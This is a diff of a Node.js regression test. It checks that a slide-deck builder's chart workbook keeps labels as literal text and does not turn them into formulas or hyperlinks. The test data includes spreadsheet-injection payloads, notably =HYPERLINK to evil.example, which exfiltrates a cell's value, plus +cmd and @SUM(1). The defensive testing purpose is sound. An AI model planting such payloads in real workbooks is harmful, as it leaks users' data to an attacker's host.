@@ -5,7 +5,7 @@
 //                                   component arguments could be registry URLs or flags.
 //   uupm-design cip/render-html.py  symlinked *.png files were base64-embedded into the page;
 //                                   brand/file-derived text reached the HTML unescaped.
-//   intent-present build_deck.py    chart labels starting with "=" became workbook formulas.
+//   intent-present build_deck.py    chart labels became workbook formulas and hyperlinks.
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
@@ -119,31 +119,67 @@ const DECK = {
   upstream: join(repo, "vendor/upstream/intent/skills/present/references/build_deck.py"),
 };
 
-// build_deck.py imports python-pptx at load time; _validate needs none of it, so stub the modules.
-function deckValidate(script, spec) {
-  return py(`import json, sys, types
+// Labels the chart workbook must keep as literal text: XlsxWriter's write() turns "=..." into a
+// formula and http(s)/ftp/mailto/internal/external strings into hyperlinks or external references.
+const HOSTILE_LABELS = ['=HYPERLINK("https://evil.example/?"&B2,"x")', "http://evil.example", "mailto:x@evil.example", "external:x", "+cmd", "-5% churn"];
+
+// build_deck.py imports python-pptx at load time; stub it so the workbook options are checked
+// everywhere python3 exists, not only where python-pptx is installed.
+test("build_deck.py makes python-pptx write the chart workbook with formula and URL conversion off", { skip }, () => {
+  const out = py(`import json, sys, types
 class Any:
     def __init__(self, *a, **k): pass
     def __call__(self, *a, **k): return Any()
     def __getattr__(self, name): return Any()
-for name in ["pptx", "pptx.util", "pptx.enum", "pptx.enum.text", "pptx.dml", "pptx.dml.color", "pptx.chart", "pptx.chart.data", "pptx.enum.chart", "pptx.enum.shapes"]:
+for name in ["pptx", "pptx.util", "pptx.enum", "pptx.enum.text", "pptx.dml", "pptx.dml.color", "pptx.chart", "pptx.chart.data", "pptx.enum.chart", "pptx.enum.shapes", "pptx.chart.xlsx"]:
     mod = types.ModuleType(name)
     mod.__getattr__ = lambda attr: Any()
     sys.modules[name] = mod
+    if "." in name:
+        parent, _, child = name.rpartition(".")
+        setattr(sys.modules[parent], child, mod)
 sys.modules["pptx.util"].Emu = int
+seen = []
+sys.modules["pptx.chart.xlsx"].Workbook = lambda f, opts=None: seen.append(opts)
 import runpy
-m = runpy.run_path(sys.argv[1])
-try:
-    m["_validate"](json.loads(sys.argv[2]))
-    print("accepted")
-except ValueError as e:
-    print("rejected: " + str(e))`, [script, JSON.stringify(spec)]);
+runpy.run_path(sys.argv[1])
+sys.modules["pptx.chart.xlsx"].Workbook("blob", {"in_memory": True})
+print(json.dumps(seen))`, [DECK.muster]);
+  assert.deepEqual(JSON.parse(out), [{ in_memory: true, strings_to_formulas: false, strings_to_urls: false }]);
+});
+
+// End to end with the real python-pptx/XlsxWriter when they are installed: build a deck, open the
+// chart's embedded workbook and count formulas and hyperlinks.
+// No -I here: python-pptx is often a user-site install. Running a script by path puts only the
+// script's own directory on sys.path, never the working directory.
+const hasPptx = !skip && spawnSync("python3", ["-B", "-c", "import pptx"]).status === 0;
+function deckWorkbook(script, labels) {
+  const dir = mkdtempSync(join(tmpdir(), "muster-deck-"));
+  try {
+    const spec = { slides: [{ layout: "claim_chart", title: "Growth", alt: "bar chart", chart: { type: "bar", categories: labels, series: [{ name: "@SUM(1)", values: labels.map(() => 1) }] } }] };
+    writeFileSync(join(dir, "deck.json"), JSON.stringify(spec));
+    const build = spawnSync("python3", ["-B", script, join(dir, "deck.json"), join(dir, "out.pptx")], { encoding: "utf8", cwd: dir });
+    if (build.status !== 0) throw new Error(build.stderr);
+    return JSON.parse(py(`import io, json, re, sys, zipfile
+z = zipfile.ZipFile(sys.argv[1])
+x = zipfile.ZipFile(io.BytesIO(z.read(next(n for n in z.namelist() if n.endswith(".xlsx")))))
+sheet = x.read("xl/worksheets/sheet1.xml").decode()
+names = x.namelist()
+shared = x.read("xl/sharedStrings.xml").decode() if "xl/sharedStrings.xml" in names else ""
+print(json.dumps({"formulas": len(re.findall(r"<f>", sheet)), "hyperlinks": len(re.findall(r"<hyperlink\\b", sheet)),
+  "rels": [n for n in names if "worksheets/_rels" in n], "shared": shared}))`, [join(dir, "out.pptx")]));
+  } finally {
+    rmSync(dir, { recursive: true, force: true });
+  }
 }
 
-test("build_deck.py rejects chart labels that would become spreadsheet formulas", { skip }, () => {
-  const chart = (categories, name = "Revenue") => ({ slides: [{ layout: "claim_chart", title: "Growth", alt: "bar chart", chart: { type: "bar", categories, series: [{ name, values: categories.map(() => 1) }] } }] });
-  assert.match(deckValidate(DECK.muster, chart(['=HYPERLINK("https://evil.example/?"&B2,"x")', "Q2"])), /rejected: .*formula/);
-  assert.match(deckValidate(DECK.muster, chart(["Q1", "Q2"], "=1+1")), /rejected: .*formula/);
-  assert.equal(deckValidate(DECK.muster, chart(["Q1", "-5% churn"])), "accepted");
-  assert.equal(deckValidate(DECK.upstream, chart(['=HYPERLINK("https://evil.example/?"&B2,"x")', "Q2"])), "accepted", "kill check: upstream accepts the formula");
+test("build_deck.py keeps =HYPERLINK, http, mailto, external and +cmd chart labels literal in the workbook", { skip: hasPptx ? false : "python-pptx not installed" }, () => {
+  const book = deckWorkbook(DECK.muster, HOSTILE_LABELS);
+  assert.equal(book.formulas, 0, "no label became a formula");
+  assert.equal(book.hyperlinks, 0, "no label became a hyperlink");
+  assert.deepEqual(book.rels, [], "no external relationship");
+  for (const label of ["HYPERLINK", "http://evil.example", "mailto:x@evil.example", "external:x", "+cmd", "@SUM(1)"]) assert.ok(book.shared.includes(label), `${label} is kept as a string`);
+  // Kill check (external:x is left out: upstream's URL parser crashes on it).
+  const upstream = deckWorkbook(DECK.upstream, HOSTILE_LABELS.filter((l) => !l.startsWith("external:")));
+  assert.ok(upstream.formulas > 0 && upstream.hyperlinks > 0, "kill check: upstream writes a formula and hyperlinks");
 });
